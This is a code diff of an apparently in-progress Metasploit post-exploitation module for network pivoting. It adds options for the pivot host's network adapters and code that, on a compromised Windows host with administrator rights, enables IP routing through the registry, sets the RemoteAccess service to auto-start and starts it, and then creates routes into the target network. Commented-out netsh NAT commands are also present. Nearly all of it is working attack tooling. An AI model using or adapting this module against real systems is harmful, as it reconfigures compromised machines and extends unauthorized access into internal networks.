@@ -31,7 +31,9 @@ class MetasploitModule < Msf::Post
       [
 		# OptBool.new( 'SYSTEMINFO', [ true, 'True if you want to get system info', 'TRUE' ])
 		OptAddressRange.new('NET',    [true, 'The network we want to arrive (Example: 10.0.0.0/24)']),
-		OptAddress.new('RHOST',    [true, 'IP address of pivot computer (our side IP)'])
+		OptAddress.new('RHOST',    [true, 'IP address of pivot computer (our side IP)']),
+		OptString.new('NInt01', [true, 'Name of pivot network adapter of our network']),
+		OptString.new('NInt02', [true, 'Name of pivot network adapter of the other network']),
       ])
   end
 	#Obtenemos el OS de instalacion de metasploit
@@ -52,33 +54,79 @@ class MetasploitModule < Msf::Post
 		#
 
 	end
-
+	
+	def getStatus(status)
+		#
+		# Get Status in dtring format
+		#
+		
+		case status.to_s
+		when '1'
+			return 'Stoped'
+		when '4'
+			return 'Started'
+		when '7'
+			return 'Disabled'
+		end
+		return "Unknown status: #{status.to_s}"
+	end
+	
 	def windows_pivot()
 		#
 		# Windows commands
 		#
 		if is_admin?
 		
-			rra_status = service_info("RemoteAccess")
+			rra_info = service_info("RemoteAccess")
+			rra_status = getStatus(rra_info[:status])
+			key = "HKLM\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\\"
+			iprouting_status = registry_getvalinfo(key,"IPEnableRouter")["Data"]
+			print_status("Initial values:")
+			print_status("	Service RemoteAccess status: #{rra_status}")
+			print_status("	IPEnableRouter value: #{iprouting_status}")
+			puts("")
+			print_status("Starting the proccess...")
+			print_status("	Enabling IP Router...")
 			
-			# iprouting_status = --> Valor inicial del registro IPEnableRouter
-			# print_status("Initial values:")
-			# print_line("	El servicio RRA se encuentra #{rra_status}")
-			# print_line("	El valor de IPEnableRouter es #{iprouting_status}")
-			# https://www.offensive-security.com/metasploit-unleashed/api-calls/
-			# Lee las interfaces de red
-			# print_status(client.net.config.interfaces)
+			if rra_status != 'Started'
+				if registry_setvaldata(key, "IPEnableRouter", "1", "REG_DWORD")
+					print_good("	IP Routing is Enabled.")
+				else
+					print_bad("  	There was an error set the IPEnableRouter value.")
+					# Exit.
+				end
+			else
+				print_good("	IP Routing is Enabled.")
+			end
 			
-			print_status("status: #{service_info("RemoteAccess")[:status].to_s}")
-			print_status(service_info("RemoteAccess").to_s)
-			# print_status("Enabling IP Router...")
-			# print_good(cmd_exec("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\" /f /v IPEnableRouter /t REG_DWORD /d 1"))
-			# print_status("Enabling Routing and Remote Access service...")
-			# print_good(cmd_exec("sc config RemoteAccess start= auto"))
-			# print_status("Starting Routing and Remote Access service...")
-			# print_good(cmd_exec("net start RemoteAccess"))
+			# Esto es para W2003 y XP
+			# print_status(cmd_exec("netsh routing ip nat install"))
+			# print_status(cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt02']}\" full"))
+			# print_status(cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt01']}\" private"))
+			
+			# Para Windows Vista y mayores se hace compartiendo conexión de red en las propiedades del adaptador.
+			# De igual manera se hace con los TAP (VPN)
+			
+			
+			print_status("	Enabling Routing and Remote Access service...")
+			if service_change_startup("RemoteAccess",2)
+				print_good("	RemoteAccess service enabled.")
+			else
+				print_bad("  	There was an error enabling RemoteAccess service.")
+				# Exit
+			end
+			print_status("	Starting Routing and Remote Access service...")
+			if service_start("RemoteAccess")
+				print_good("	RemoteAccess service started.")
+			else
+				print_bad("  	There was an error starting RemoteAccess service.")
+				# Exit
+			end
+			
+			puts("")
 		else
-			print_bad("You have to be administrator to execute this module.")
+			print_bad("You have to be administrator in the pivot machine to execute this module.")
+		end
 	end
 	#
   	# acciones segun eleccion plataforma
@@ -159,16 +207,13 @@ class MetasploitModule < Msf::Post
 			# print_status("Computer name: #{'Computer'} ")
 			# print_status("Current user: #{session.sys.config.getuid}")
 			set_pivot()
-			# create_route()
+			create_route()
 			#para saber si las rutas son correctas
-			print_status("windows: route -p add #{get_net(datastore['NET'])} mask #{get_netmask(datastore['NET'])} METRIC 1")
-			print_status("linux: route add -net #{datastore['NET']} gw #{datastore['RHOST']}")
+			# print_status("windows: route -p add #{get_net(datastore['NET'])} mask #{get_netmask(datastore['NET'])} METRIC 1")
+			# print_status("linux: route add -net #{datastore['NET']} gw #{datastore['RHOST']}")
 		else
 			print_bad("Aborting Module.")
 		end
 			
   	end
 end
-
-# Service_info
-		#{:starttype=>2, :display=>"Routing and Remote Access", :startname=>"LocalSystem", :path=>"C:\\WINDOWS\\system32\\svchost.exe -k netsvcs", :logroup=>"", :interactive=>false, :dacl=>"D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CR;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;PU)", :status=>4}
